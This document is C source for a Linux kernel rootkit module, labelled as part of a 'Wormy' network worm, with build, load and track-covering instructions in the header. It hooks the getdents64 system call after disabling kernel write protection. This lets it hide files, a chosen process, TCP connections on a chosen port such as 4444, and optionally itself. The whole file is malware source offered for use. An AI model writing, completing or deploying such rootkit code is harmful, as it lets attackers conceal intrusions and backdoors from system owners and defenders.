/*
 * Wormy ML Network Worm v3.0 — Linux LKM Rootkit Skeleton
 * Hides processes, files, and TCP connections from user-space tools.
 *
 * Build:
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *
 * Load (requires root):
 *   insmod rootkit.ko hide_pid=1234 hide_port=4444
 *
 * Remove tracks:
 *   echo "rootkit" > /proc/sys/kernel/tainted   (optional)
 *   rmmod rootkit   (or keep loaded and remove from /sys/module)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/net.h>
#include <net/tcp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Wormy");
MODULE_DESCRIPTION("Wormy LKM rootkit skeleton");
MODULE_VERSION("3.0");

// ─── Parameters ───────────────────────────────────────────────────────────────

static int hide_pid  = 0;
static int hide_port = 0;
module_param(hide_pid,  int, 0);
module_param(hide_port, int, 0);
MODULE_PARM_DESC(hide_pid,  "PID to hide from /proc");
MODULE_PARM_DESC(hide_port, "TCP port to hide from /proc/net/tcp");

// ─── Hook infrastructure (kallsyms + write_cr0) ───────────────────────────────

typedef asmlinkage long (*orig_getdents64_t)(
    const struct pt_regs *);
typedef asmlinkage long (*orig_kill_t)(
    const struct pt_regs *);

static orig_getdents64_t orig_getdents64 = NULL;
static orig_kill_t       orig_kill       = NULL;
static unsigned long     *syscall_table  = NULL;

// Disable write protection on cr0
static inline void disable_wp(void) {
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x00010000UL);
}
static inline void enable_wp(void) {
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 | 0x00010000UL);
}

// ─── /proc hiding via seq_file hook ──────────────────────────────────────────
// Replace the show() function of /proc/<pid>/stat to return -1 for hidden pids.

// ─── getdents64 hook — hide files and /proc/<pid> entries ────────────────────

#define HIDDEN_PREFIX "wormy_"    // files starting with this are hidden
#define HIDDEN_PID_STR_MAX 16

static asmlinkage long hk_getdents64(const struct pt_regs *regs)
{
    long   ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 __user *dirent = (void *)regs->si;
    long   bpos = 0;
    char   d_name[256];
    char   hidden_pid_str[HIDDEN_PID_STR_MAX];

    snprintf(hidden_pid_str, sizeof(hidden_pid_str), "%d", hide_pid);

    while (bpos < ret) {
        struct linux_dirent64 *d = (void *)((char *)dirent + bpos);
        long   reclen = d->d_reclen;

        if (copy_from_user(d_name, d->d_name, sizeof(d_name) - 1)) {
            bpos += reclen;
            continue;
        }
        d_name[sizeof(d_name)-1] = '\0';

        bool should_hide = false;

        // Hide by PID (numeric match)
        if (hide_pid && strcmp(d_name, hidden_pid_str) == 0)
            should_hide = true;

        // Hide files with HIDDEN_PREFIX
        if (strncmp(d_name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0)
            should_hide = true;

        if (should_hide) {
            // Remove this entry by shifting subsequent entries backward
            char *next = (char *)d + reclen;
            long  tail = ret - bpos - reclen;
            memmove(d, next, tail);
            ret -= reclen;
        } else {
            bpos += reclen;
        }
    }
    return ret;
}

// ─── TCP connection hiding (/proc/net/tcp show hook) ─────────────────────────

static int (*orig_tcp4_seq_show)(struct seq_file *, void *) = NULL;

static int hk_tcp4_seq_show(struct seq_file *seq, void *v)
{
    // If v is a tcp socket, check its local port
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = v;
        __u16 port = ntohs(inet_sk(sk)->inet_sport);
        if (port == (unsigned short)hide_port) {
            return 0;   // Skip — don't print this connection
        }
    }
    return orig_tcp4_seq_show(seq, v);
}

// ─── /proc/<pid> task_struct hide ─────────────────────────────────────────────

static void hide_task(int pid)
{
    struct task_struct *task;
    rcu_read_lock();
    for_each_process(task) {
        if (task->pid == pid) {
            // Remove from task list (DKOM equivalent on Linux)
            list_del_rcu(&task->tasks);
            // Also remove from sibling and children lists
            list_del_rcu(&task->sibling);
            rcu_read_unlock();
            pr_info("[wormy] PID %d hidden from task list\n", pid);
            return;
        }
    }
    rcu_read_unlock();
    pr_warn("[wormy] PID %d not found\n", pid);
}

// ─── Self-hiding: remove from /sys/module ─────────────────────────────────────

static void hide_module(void)
{
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    pr_info("[wormy] Module hidden from /sys/module\n");
}

// ─── Hook installation ────────────────────────────────────────────────────────

static int install_hooks(void)
{
    // Find syscall table via kallsyms
    syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        pr_err("[wormy] sys_call_table not found\n");
        return -ENOENT;
    }

    orig_getdents64 = (orig_getdents64_t)syscall_table[__NR_getdents64];

    disable_wp();
    syscall_table[__NR_getdents64] = (unsigned long)hk_getdents64;
    enable_wp();

    // Hook tcp4_seq_show via /proc/net/tcp file_operations
    // We find the proc entry and replace the seq_ops->show pointer
    struct file *f = filp_open("/proc/net/tcp", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        struct seq_file *seq = f->private_data;
        if (seq && seq->op) {
            struct seq_operations *ops = (struct seq_operations *)seq->op;
            orig_tcp4_seq_show = ops->show;
            // Make page writable
            unsigned long addr = (unsigned long)&ops->show;
            set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 2);
            ops->show = hk_tcp4_seq_show;
        }
        filp_close(f, NULL);
    }

    pr_info("[wormy] Hooks installed (getdents64, tcp4_seq_show)\n");
    return 0;
}

static void remove_hooks(void)
{
    if (syscall_table && orig_getdents64) {
        disable_wp();
        syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
        enable_wp();
    }
    pr_info("[wormy] Hooks removed\n");
}

// ─── Module init / exit ───────────────────────────────────────────────────────

static int __init rootkit_init(void)
{
    pr_info("[wormy] LKM rootkit v3.0 loading...\n");

    int ret = install_hooks();
    if (ret) return ret;

    if (hide_pid)
        hide_task(hide_pid);

    // Uncomment to self-hide (makes rmmod impossible without PID kill):
    // hide_module();

    pr_info("[wormy] Loaded. hide_pid=%d hide_port=%d\n", hide_pid, hide_port);
    return 0;
}

static void __exit rootkit_exit(void)
{
    remove_hooks();
    pr_info("[wormy] LKM rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
